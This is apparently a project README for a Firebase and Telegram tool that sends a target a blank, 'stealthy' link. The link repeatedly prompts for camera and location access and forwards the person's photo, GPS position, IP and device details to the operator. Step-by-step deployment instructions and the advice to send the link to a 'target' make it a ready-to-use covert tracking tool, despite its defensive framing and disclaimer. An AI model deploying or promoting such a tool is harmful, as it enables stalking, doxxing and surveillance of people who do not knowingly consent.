# 🛡️ Defensive Data Collector (Cyber Complaint Evidence Tool)

A lightweight, stateless web application designed to capture evidence (Location, Photo, IP, Device Info) from a target device and forward it instantly to a Telegram Bot. 

**Intention:** This tool is built for **defensive purposes**. If you are being scammed or threatened, you can send this link to the perpetrator. When they open it, their device details and location (if permitted) are captured and sent to you as evidence for filing a cyber-crime complaint.

---

## ✨ Features

*   **📸 Photo Capture**: Captures a photo using the front camera (if allowed).
*   **📍 Precision Location**: Captures GPS coordinates and sends a clickable **Google Maps link** + **Live Map Preview**.
*   **🌐 Network Intel**: Captures Public IP Address and User-Agent (Browser/Device info).
*   **🚫 Error Diagnostics**: Explicitly reports if the user *Blocked* permissions or if the request *Timed Out*.
*   **🔄 Aggressive Retry**: If the browser blocks auto-capture, any tap/click on the page triggers a new permission request.
*   **☁️ Stateless**: No database required. Data flows directly from `Frontend -> Firebase Function -> Telegram`.
*   **👻 Stealthy**: Serves a simple blank white page to the target.

---


## 🏗️ Architecture

1.  **Frontend (`public/`)**: A blank HTML/JS page hosted on Firebase Hosting. It requests Camera/Location permissions on load (and re-tries on click).
2.  **Backend (`functions/`)**: A Firebase Cloud Function (`collectData`) running Node.js. It receives the data, formats it, and sends it to Telegram.
3.  **Delivery**: Telegram Bot API receiving multipart/form-data (photos) and JSON (location/text).

---

## 🚀 Prerequisites

1.  **Node.js** (v20 or higher) installed.
2.  **Firebase CLI**: Install via `npm install -g firebase-tools`.
3.  **Google Cloud Account**: For deploying Firebase Functions.
4.  **Telegram Bot**: Create one via [@BotFather](https://t.me/BotFather) to get your `BOT_TOKEN` and `CHAT_ID`.

---

## 🛠️ Installation & Setup

### 1. Clone the Repository
```bash
git clone https://github.com/tnvsai/cyber_telegram_bot
cd cyber_telegram_bot
```

### 2. Install Backend Dependencies
```bash
cd functions
npm install
cd ..
```

### 3. Configure Telegram Credentials
Open `functions/telegram.js` and replace the placeholder asterisks with your actual credentials:

```javascript
// functions/telegram.js
const token = "YOUR_BOT_TOKEN_HERE";  // e.g., "123456:ABC-DEF..."
const chatId = "YOUR_CHAT_ID_HERE";   // e.g., "987654321"
```

### 4. Initialize Firebase
If you haven't linked this to your Firebase project yet:
```bash
firebase login
firebase use --add  # Select your project (or create a new one)
```
*Make sure to select an existing project or create one on the [Firebase Console](https://console.firebase.google.com/).*

### 5. Enable Required APIs
For Firebase Functions (2nd Gen) to deploy, you **must enable the Artifact Registry API** in your Google Cloud Console.
*   Go to: `Google Cloud Console -> APIs & Services -> Library`.
*   Search for **"Artifact Registry API"**.
*   Click **Enable**.

### 6. Deploy
```bash
firebase deploy

```
This will deploy both the Hosting (Frontend) and Functions (Backend).

---

## 📖 Usage

1.  After deployment, Firebase will give you a **Hosting URL** (e.g., [`https://your-project.web.app`].
2.  Send this link to the target (or test it on yourself).
3.  **On the Target Device**:
    *   The page will load (blank white).
    *   Browser will ask for "Camera" and "Location" permissions.
    *   **If Allowed**: You receive Photo + Location + IP in Telegram.
    *   **If Blocked**: You receive IP + User-Agent + "Permission Denied" error in Telegram.
    *   **If Ignored**: Tapping anywhere on the screen will re-prompt for permissions.

---

## ⚠️ Disclaimer
This tool is intended for **legitimate defensive use cases** (e.g., collecting evidence against cyber-criminals). 
*   **Do not use for illegal spying, harassment, or unauthorized surveillance.**
*   The tool respects browser security models (it cannot force-enable camera/location without user consent).
*   The author assumes no responsibility for misuse.

---

## 📂 Project Structure
```
.
├── firebase.json        # Firebase configuration (Rewrite rules)
├── .firebaserc          # Project aliases
├── public/
│   ├── index.html       # The blank frontend page
│   └── main.js          # Logic for capturing and sending data
└── functions/
    ├── package.json     # Backend dependencies (firebase-functions, axios, form-data)
    ├── index.js         # Cloud Function entry point
    └── telegram.js      # Telegram API helpers (SendPhoto, SendLocation)
```
